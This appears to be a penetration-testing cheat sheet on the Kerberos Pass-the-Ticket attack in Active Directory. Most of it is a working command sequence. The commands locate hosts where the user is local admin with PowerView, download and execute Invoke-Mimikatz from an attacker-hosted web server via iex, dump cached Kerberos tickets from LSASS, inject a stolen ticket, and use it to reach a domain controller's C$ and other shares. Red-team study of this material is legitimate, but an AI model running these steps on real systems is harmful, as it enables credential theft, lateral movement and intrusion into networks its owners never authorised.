---
title: Pass the Ticket (PtT)
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Stole kerberos tickets to authenticate to resources (shares, computers...) as a user without having to compromise the password.
1. **Without administrative privileges**: we can obtain the TGT and all TGS for the current user using a technique called fake delegation
2. **With administrative privileges**: we can dump the LSASS process and obtain all TGTs and TGS tickets cached on the system.

> [!Info]
> TGS tickets are exportable and can be used across sessions and systems while TGT tickets are tied to a specific session.

Steps (for second option):
1. Load PowerView and find machines within the current AD Domain where the current user has local administrator access:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1

PS> whoami
PS> hostname
PS> Find-LocalAdminAccess (find machine within the current AD Domain where the current user has local administrator access)

PS> Enter-PSSession FQDN_SYSTEM (PSRemote into systems)
PS [remote]> whoami /privs (we should have admin privileges)
```

2. Dump all tickets from memory:
```powershell
*Create an HFS server and upload Invoke-Mimikatz.ps1*
PS [remote]> iex (New-Object Net-WebClient).DownloadString('http://LOCAL_IP/Invoke-Mimikatz.ps1')

PS [remote]> Invoke-Mimikatz.ps1 -Command '"sekurlsa::tickets /export"' (export TGS tickets)
PS [remote]> dir *.kirbi
```

Select the `USER@TARGET.kirbi` ticket we are interested in.

3. Use the tickets to access resources and other systems:
```powershell
PS [remote]> Invoke-Mimikatz -Command '"kerberos::ptt FULL_TICKET_NAME.kirbi"' (introduce the extracted ticket into our current PS session)
Parameters:
FULL_TICKE_NAME: ticket name for example [...]-...maintainer-krbtgt-FQDN (try maintainer@krbtgt to access the DC)

PS [remote]> klist (list current tickets. We should have the new ticket loaded)
NOTE: check the renew time for persistence

Invoke Powerview to check the DC FQDN and access the DC using the extracted ticket:
PS> . .\PowerView.ps1
PS> Get-Domain (check DC FQDN)
PS [remote]> ls \\DC_FQDN\c$ (check if we can access the C drive from the DC)
```

4. Access the target leveraging the ticket:
```powershell
If the ticket is CIFS, we can access the target shares:

1. Enumerate available shares:
C:\> net view \\TARGET_HOSTNAME # CMD
PS C:\> Get-SmbShare -CimSession TARGET_HOSTNAME # PSH
$ crackmapexec smb TARGET_HOSTNAME -k --shares # Linux

2. Enumerate and access the shares:
PS C:\> ls \\TARGET_HOSTNAME\SHARE\
PS C:\> cat \\TARGET_HOSTNAME\SHARE\file
...
```
